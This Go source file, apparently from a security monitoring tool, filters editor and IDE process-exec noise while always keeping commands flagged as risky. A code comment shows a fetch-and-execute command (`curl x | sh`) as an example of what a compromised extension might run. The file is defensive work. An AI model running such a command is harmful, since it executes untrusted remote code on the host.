package main

import "strings"

// isEditorNoise reports whether an exec is routine editor/IDE housekeeping that
// floods the feed (VSCode git polling, language servers). It matches when the
// acting OR parent process name is in parents.
//
// Safety: looksRisky-positive commands are NEVER suppressed, so a compromised
// editor extension (e.g. `bash -c "curl x | sh"` spawned by code) still reaches
// the model. We only drop commands that would otherwise resolve benign anyway.
// Provenance keys on the EXEC's immediate parent: an interactive `git status`
// typed in a terminal has parent_comm "bash"/"zsh", not "node"/"code", so it is
// not suppressed. An empty parents map disables suppression entirely.
func isEditorNoise(e ExecEvent, parents map[string]bool) bool {
	if len(parents) == 0 {
		return false
	}
	if looksRisky(e) {
		return false
	}
	return parents[e.Comm] || parents[e.ParentComm]
}

// parseNameSet splits a comma-separated flag into a set of process names.
func parseNameSet(s string) map[string]bool {
	set := map[string]bool{}
	for _, p := range strings.Split(s, ",") {
		if p = strings.TrimSpace(p); p != "" {
			set[p] = true
		}
	}
	return set
}
